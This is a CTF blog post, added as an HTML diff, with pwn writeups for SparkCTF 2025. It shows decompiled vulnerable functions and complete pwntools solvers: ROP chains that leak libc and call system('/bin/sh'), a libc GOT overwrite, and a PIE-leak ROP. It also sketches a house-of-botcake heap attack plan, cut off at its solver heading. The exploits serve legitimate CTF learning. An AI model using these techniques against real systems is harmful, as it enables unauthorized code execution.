@@ -1,0 +1,733 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <link rel="shortcut icon" href="assets/images/luffy.jpg" sizes="any">
+    <link rel="icon" href="assets/images/luffy.jpg" type="image/svg+xml">
+    <link rel="stylesheet" href="/assets/styles/global.css">
+    <title>SparkCTF 2025  | PWN writeups | Buddurid's blog</title>
+
+    <!-- SEO Metadata -->
+    <meta property="og:title" content="SparkCTF 2025  | PWN writeups | Buddurid's blog" />
+    <meta property="og:site_name" content="Buddurid's blog" />
+    <meta property="description" content="brief solvers and explanations" />
+    <meta property="og:description" content="brief solvers and explanations" />
+    <meta property="og:type" content="website">
+    <meta property="og:image" content="https://buddurid.github.io/assets/images/luffy.jpg">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="theme-color" content="#FFBD3F" />
+    <link rel="canonical" href="https://buddurid.github.io/2025/02/22/SparkCTF-2025" />
+
+    <!-- KaTeX -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css" integrity="sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3+Aro6EYUG4+cU+KJWu/X" crossorigin="anonymous">
+
+</head>
+<body><div class="load" id="load">
+    <pre class="term" id="term">buddurid@CTF:~$ </pre>
+    <script src="/assets/splashscreen.js"></script>
+</div><nav class="open">
+    <div class="hex" role="img" aria-label="Navigation bar background graphic, styled like the address panel of a hex editor.">
+        <ol><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/></ol>
+    </div>
+    <ul>
+        <li id="splash-hack-zero-for-reference" aria-hidden="true">0</li><li >
+                <a href="/"
+                   title="Me">Me</a>
+            </li><li style="z-index: 1;">
+                <a href="/blog"
+                   title="Blog"highlighted>Blog</a>
+            </li><li >
+                <a href="/ctfs"
+                   title="CTFs">CTFs</a>
+            </li></ul>
+
+</nav>
+
+<div class="nav-toggle hamburger-container">
+    <div class="hamburger-button"></div>
+</div>
+
+
+<script>
+    const responsiveNavThreshold = 500;
+    const navOpener = document.querySelector('.nav-toggle');
+    const nav = document.querySelector('nav');
+
+    const toggle = (cl, attr) => cl.contains(attr) ? cl.remove(attr) : cl.add(attr);
+
+    navOpener.addEventListener('click', () => {
+        toggle(nav.classList, 'open');
+    });
+
+    let enabled = false;
+
+    const setResponsive = () => {
+        if (window.innerWidth < responsiveNavThreshold) {
+            if (enabled) return;
+            enabled = true;
+            nav.classList.remove('open');
+            navOpener.classList.add('enabled');
+        }
+        else {
+            if (!enabled) return;
+            enabled = false;
+            nav.classList.add('open');
+            navOpener.classList.remove('enabled');
+        }
+    };
+    setResponsive();
+    window.addEventListener('resize', setResponsive);
+</script>
+<div class="content">
+            <main>
+                <article>
+    <h1 class="post-title">SparkCTF 2025  | PWN writeups</h1>
+    <p class="post-author-date"><b></b><em> - February 22, 2025</em></p>
+
+
+    <div class="tags">
+
+        <strong>Categories: </strong>
+
+        
+        <span>PWN</span>
+        
+        <span>libc</span>
+        
+        <span>heap</span>
+        
+        <span>botcake</span>
+        
+        <span>wilderness</span>
+        
+
+    </div>
+
+    <p><i>brief solvers and explanations</i></p>
+
+    <hr>
+
+    <h1 id="the-notorious-libic">The Notorious liB.I.C</h1>
+
+<pre><code class="language-C">__int64 quest()
+{
+  char v1[64]; // [rsp+0h] [rbp-40h] BYREF
+
+  puts("What you need to find out? &gt; ");
+  return gets(v1);
+}
+</code></pre>
+
+<p>Description :</p>
+
+<ul>
+  <li>no PIE</li>
+  <li>we have <code class="language-plaintext highlighter-rouge">pop rdi</code> gadget</li>
+  <li>we can execute the quest above function</li>
+</ul>
+
+<p>Plan :</p>
+
+<ul>
+  <li>typical ROP chain to execute this : <em>Puts(puts)</em> to get puts address in libc , so we can calculate the libc.address</li>
+  <li>restart</li>
+  <li>ROP chain to do this : system(“/bin/sh”)</li>
+  <li>gg</li>
+</ul>
+
+<p>Solver:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
+
+<span class="k">def</span> <span class="nf">debug</span><span class="p">():</span>
+        <span class="k">if</span> <span class="n">local</span><span class="o">&lt;</span><span class="mi">2</span><span class="p">:</span>
+                <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s">'''
+
+                        '''</span><span class="p">)</span>
+<span class="c1">###############   files setup   ###############
+</span><span class="n">local</span><span class="o">=</span><span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span>
+<span class="n">exe</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s">"./main_patched"</span><span class="p">)</span>
+<span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">)</span>
+<span class="n">nc</span><span class="o">=</span><span class="s">"nc tcp.espark.tn 5087"</span>
+<span class="n">port</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">nc</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">)[</span><span class="mi">2</span><span class="p">])</span>
+<span class="n">host</span><span class="o">=</span><span class="n">nc</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+
+<span class="c1">############### remote or local ###############
+</span><span class="k">if</span> <span class="n">local</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">:</span>
+        <span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+        <span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="p">.</span><span class="n">path</span><span class="p">])</span>
+
+<span class="c1">############### helper functions ##############
+</span><span class="k">def</span> <span class="nf">send</span><span class="p">():</span>
+        <span class="k">pass</span>
+
+<span class="c1">############### main exploit    ###############
+</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"YES"</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Now answer to prove you're down with the struggle: "</span><span class="p">)</span>
+<span class="n">rdi</span><span class="o">=</span><span class="mh">0x0000000000400983</span>
+<span class="n">puts_plt</span><span class="o">=</span><span class="mh">0x00000000004005f0</span>
+<span class="n">puts_got</span><span class="o">=</span><span class="mh">0x601210</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"a"</span><span class="o">*</span><span class="mh">0x40</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">exe</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"quest"</span><span class="p">]))</span>
+<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"out? &gt; </span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+
+<span class="n">leak</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
+<span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="o">=</span><span class="n">leak</span><span class="o">-</span><span class="mh">0x80970</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">))</span>
+<span class="n">debug</span><span class="p">()</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"a"</span><span class="o">*</span><span class="mh">0x40</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000601000</span><span class="o">+</span><span class="mh">0xe00</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span><span class="p">)))</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000400913</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"system"</span><span class="p">])</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">exe</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"quest"</span><span class="p">]))</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<h1 id="www">www</h1>
+
+<pre><code class="language-C">unsigned __int64 vuln()
+{
+  char v1; // [rsp+Fh] [rbp-131h] BYREF
+  _QWORD *v2; // [rsp+10h] [rbp-130h] BYREF
+  __int64 v3; // [rsp+18h] [rbp-128h] BYREF
+  _QWORD *v4; // [rsp+20h] [rbp-120h] BYREF
+  _QWORD *v5; // [rsp+28h] [rbp-118h] BYREF
+  unsigned __int64 v6; // [rsp+138h] [rbp-8h]
+
+  v6 = __readfsqword(0x28u);
+  get_libc_range(&amp;v4, &amp;v5);
+  if ( !v4 || !v5 )
+  {
+    puts("Failed to find libc range!");
+    exit(1);
+  }
+  printf("Libc range: %p - %p\n", v4, v5);
+  do
+  {
+    while ( 1 )
+    {
+      printf("where ? ");
+      __isoc99_scanf("%lx", &amp;v2);
+      if ( v2 &gt;= v4 &amp;&amp; v2 &lt; v5 )
+        break;
+      puts("Error: Address not in libc range!");
+    }
+    printf("what ? ");
+    __isoc99_scanf("%lx", &amp;v3);
+    *v2 = v3;
+    printf("Do you want to write again? (y/n): ");
+    __isoc99_scanf(" %c", &amp;v1);
+  }
+  while ( v1 == 121 );
+  return v6 - __readfsqword(0x28u);
+}
+</code></pre>
+
+<p>Description :</p>
+
+<ul>
+  <li>challenge gives us the <em>libc mapping range</em></li>
+  <li>you can write a long to any address in the specified libc range (basically any writeable libc segment)</li>
+  <li>you can write an indefinite number of times (we will inly need one though)</li>
+  <li>we are given a ``win` function , binary has no PIE so we know its address</li>
+</ul>
+
+<p>WHERE and WHAT to write :</p>
+
+<ul>
+  <li>when playing this challenge , i didnt see the <code class="language-plaintext highlighter-rouge">win</code> function at first so things got a little complicated for me xd . so i was looking for a full system(“/bin/sh”) chain , but we dont need that as we have a win function</li>
+  <li>having a win function , our target most probably should be a function pointer . somewhere in libc .</li>
+  <li>one target can be some <code class="language-plaintext highlighter-rouge">*Libc Got Entry</code> . just like normal binaries have Got entries that store the address of resolved functions , Libc also has Got entries that store some resolved functions , maybe from itself or some functions from the linker , that depends</li>
+</ul>
+
+<p>Plan</p>
+
+<ul>
+  <li>first let’s verify that we can write in these GOT entries . Again , just like normal binaries , libc also can also have the <code class="language-plaintext highlighter-rouge">Relro</code> option when compiling . we can check it with checksec . and verify that it’s not <code class="language-plaintext highlighter-rouge">full relro</code></li>
+  <li>what Got entry should we write , there are plenty of them , how to choose ? One solution can be to write in every one of them until somehow it gets called . A smarter way would be to disassemble some libc function and see which function aren’t getting called directly by that function . we can disassemble puts for example .</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Dump of assembler code <span class="k">for function </span>puts:
+   0x00007ffff7c87bd0 &lt;+0&gt;:     endbr64
+   0x00007ffff7c87bd4 &lt;+4&gt;:     push   rbp
+   0x00007ffff7c87bd5 &lt;+5&gt;:     mov    rbp,rsp
+   0x00007ffff7c87bd8 &lt;+8&gt;:     push   r15
+   0x00007ffff7c87bda &lt;+10&gt;:    push   r14
+   0x00007ffff7c87bdc &lt;+12&gt;:    push   r13
+   0x00007ffff7c87bde &lt;+14&gt;:    push   r12
+   0x00007ffff7c87be0 &lt;+16&gt;:    mov    r12,rdi
+   0x00007ffff7c87be3 &lt;+19&gt;:    push   rbx
+   0x00007ffff7c87be4 &lt;+20&gt;:    sub    rsp,0x18
+   0x00007ffff7c87be8 &lt;+24&gt;:    call   0x7ffff7c28500 &lt;<span class="k">*</span>ABS<span class="k">*</span>+0xb4cb0@plt&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>lets take a loog at that last call to 0x7ffff7c28500 .</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Dump of assembler code for function *ABS*+0xb4cb0@plt:
+   0x00007ffff7c28500 &lt;+0&gt;:     endbr64
+   0x00007ffff7c28504 &lt;+4&gt;:     jmp    QWORD PTR [rip+0x1da70e]        # 0x7ffff7e02c18 &lt;*ABS*@got.plt&gt;
+   0x00007ffff7c2850a &lt;+10&gt;:    nop    WORD PTR [rax+rax*1+0x0]
+End of assembler dump.
+</code></pre></div></div>
+
+<ul>
+  <li>looks like it’s a standart plt function that calls out a GOT entry . just like that we found our target</li>
+  <li>we can write our win address at 0x7ffff7e02c18 &lt;<em>ABS</em>@got.plt&gt;</li>
+</ul>
+
+<p>Solver</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
+
+<span class="k">def</span> <span class="nf">debug</span><span class="p">():</span>
+        <span class="k">if</span> <span class="n">local</span><span class="o">&lt;</span><span class="mi">2</span><span class="p">:</span>
+                <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s">'''
+                        b* 0x00000000004014ba
+                        c
+                        b* _IO_wfile_overflow
+
+                        '''</span><span class="p">)</span>
+<span class="c1">###############   files setup   ###############
+</span><span class="n">local</span><span class="o">=</span><span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span>
+<span class="n">exe</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s">"./main"</span><span class="p">)</span>
+<span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">)</span>
+<span class="n">nc</span><span class="o">=</span><span class="s">"nc tcp.espark.tn 5515"</span>
+<span class="n">port</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">nc</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">)[</span><span class="mi">2</span><span class="p">])</span>
+<span class="n">host</span><span class="o">=</span><span class="n">nc</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+
+<span class="c1">############### remote or local ###############
+</span><span class="k">if</span> <span class="n">local</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">:</span>
+        <span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+        <span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="p">.</span><span class="n">path</span><span class="p">])</span>
+
+<span class="c1">############### helper functions ##############
+</span><span class="k">def</span> <span class="nf">send</span><span class="p">():</span>
+        <span class="k">pass</span>
+
+<span class="k">def</span> <span class="nf">write</span><span class="p">(</span><span class="n">where</span><span class="p">,</span><span class="n">what</span><span class="p">,</span><span class="n">restart</span><span class="o">=</span><span class="bp">True</span><span class="p">):</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"where ? "</span><span class="p">)</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">where</span><span class="p">)[</span><span class="mi">2</span><span class="p">:])</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"what ? "</span><span class="p">)</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">what</span><span class="p">)[</span><span class="mi">2</span><span class="p">:])</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Do you want to write again? (y/n): "</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">restart</span><span class="p">:</span>
+                <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">" y"</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+                <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">" n"</span><span class="p">)</span>
+
+<span class="c1">############### main exploit    ###############
+</span>
+<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Libc range: "</span><span class="p">)</span>
+<span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">14</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span>
+
+
+<span class="n">win</span><span class="o">=</span><span class="mh">0x00000000004011e6</span>
+<span class="n">write</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x21a098</span><span class="p">,</span><span class="n">win</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<h1 id="retro">retro</h1>
+
+<pre><code class="language-C">int vuln()
+{
+  char buf[256]; // [rsp+0h] [rbp-100h] BYREF
+
+  puts("Welcome to the Spark service!");
+  printf("&gt;&gt; ");
+  read(0, buf, 0x200uLL);
+  return printf("You said: %s\n", buf);
+}
+</code></pre>
+
+<p>Description :</p>
+
+<ul>
+  <li>obvious BOF</li>
+  <li>Pie is enabled , so we need leaks</li>
+  <li>we have <code class="language-plaintext highlighter-rouge">pop rdi</code> gadget</li>
+  <li>no win function</li>
+</ul>
+
+<p>Plan</p>
+
+<ul>
+  <li>we only change the first byte of the return address , so we can both restart and leak the return address using the printf . the leaked address belong the the exeuctable .</li>
+  <li>after getting the PIE leak and restart , it becomes a typical puts(puts) into system(“/bin/sh”) just like the first challenge</li>
+</ul>
+
+<p>Solver</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
+
+<span class="k">def</span> <span class="nf">debug</span><span class="p">():</span>
+        <span class="k">if</span> <span class="n">local</span><span class="o">&lt;</span><span class="mi">2</span><span class="p">:</span>
+                <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s">'''
+                        b* vuln+103
+                        '''</span><span class="p">)</span>
+<span class="c1">###############   files setup   ###############
+</span><span class="n">local</span><span class="o">=</span><span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span>
+<span class="n">exe</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s">"./main_patched"</span><span class="p">)</span>
+<span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">)</span>
+<span class="n">nc</span><span class="o">=</span><span class="s">"nc tcp.espark.tn 6112"</span>
+<span class="n">port</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">nc</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">)[</span><span class="mi">2</span><span class="p">])</span>
+<span class="n">host</span><span class="o">=</span><span class="n">nc</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+
+<span class="c1">############### remote or local ###############
+</span><span class="k">if</span> <span class="n">local</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">:</span>
+        <span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+        <span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="p">.</span><span class="n">path</span><span class="p">])</span>
+
+<span class="c1">############### helper functions ##############
+</span><span class="k">def</span> <span class="nf">send</span><span class="p">():</span>
+        <span class="k">pass</span>
+
+<span class="c1">############### main exploit    ###############
+</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"a"</span><span class="o">*</span><span class="mh">0x108</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x16</span><span class="p">))</span>
+<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"a"</span><span class="o">*</span><span class="mh">0x108</span><span class="p">)</span>
+<span class="n">exe</span><span class="p">.</span><span class="n">address</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span><span class="o">-</span><span class="mh">0x1216</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">exe</span><span class="p">.</span><span class="n">address</span><span class="p">))</span>
+
+<span class="n">puts_plt</span><span class="o">=</span><span class="n">exe</span><span class="p">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x0000000000001030</span>
+<span class="n">puts_got</span><span class="o">=</span><span class="n">exe</span><span class="p">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x3fb8</span>
+<span class="n">rdi</span><span class="o">=</span><span class="n">exe</span><span class="p">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x0000000000001226</span>
+<span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"a"</span><span class="o">*</span><span class="mh">0x100</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">exe</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"main"</span><span class="p">]))</span>
+<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"a"</span><span class="o">*</span><span class="mh">0x100</span><span class="o">+</span><span class="sa">b</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span><span class="o">-</span><span class="mh">0x87bd0</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">))</span>
+
+<span class="c1">#debug()
+</span><span class="n">ret</span><span class="o">=</span><span class="n">exe</span><span class="p">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x00000000000011d0</span>
+<span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"a"</span><span class="o">*</span><span class="mh">0x100</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">exe</span><span class="p">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x4000</span><span class="o">+</span><span class="mh">0xe00</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">"/bin/sh"</span><span class="p">)))</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"system"</span><span class="p">]))</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<h1 id="roller">Roller</h1>
+
+<p>a heap challenge with these functionnalities :</p>
+
+<ul>
+  <li>allocate anything of size &lt; 0x100</li>
+  <li>free with the pointer not being nulled out : Dangling pointer</li>
+  <li>show the contents of a chunk using printf : stops on null byte</li>
+</ul>
+
+<p>Plan</p>
+
+<ul>
+  <li>we can free a chunk into tcache then read it with show() »&gt; heap leak</li>
+  <li>we can free 7 chunks , they will fill tcache , if we free and 8th chunk it will be put into unsorted bin »&gt; libc leak</li>
+  <li>
+    <p>the UAF vuln we have allows us to only free and show already freed chunks, show wont crush the program . but if we free the same chunk twice stupidly , the program will crush with <code class="language-plaintext highlighter-rouge">double free exception</code> . so how do we bypass that and try to get overlapping chunks ??</p>
+  </li>
+  <li>there is an attack known to this thing , that is called <a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_botcake.c">house of botcake</a> . you dont need to understand the whole technique but just the part we need .</li>
+  <li>what this technique does is make use of these bugs/features xD :
+    <ul>
+      <li>when a chunk is put into unsorted bin (but is not the actual head of the chunk , meaning the chunk consolidated backwards with another chunk) , and when you try to free it again , there is a free spot in the tcache , it will not detect that it is already freed , and it will put into tcache .</li>
+    </ul>
+  </li>
+  <li>we use the technique explained above . and we get this layout : unsorted bin chunk of size(0x1c0) , the second half this chunk is in the tcache freelist of size 0xe0</li>
+  <li>what we do allocate 0x100 (it will split the 0x1c0 chunk), that we the get a chunk that can modifie the contents of the second half</li>
+  <li>we modife the fd pointer of the tcache freelist so it points to our target that we want to overwrite. we shouldnt forget about safelinking when writing the pointer</li>
+  <li>i chose to overwrite stdout for RCE</li>
+</ul>
+
+<p>Solver :</p>
+
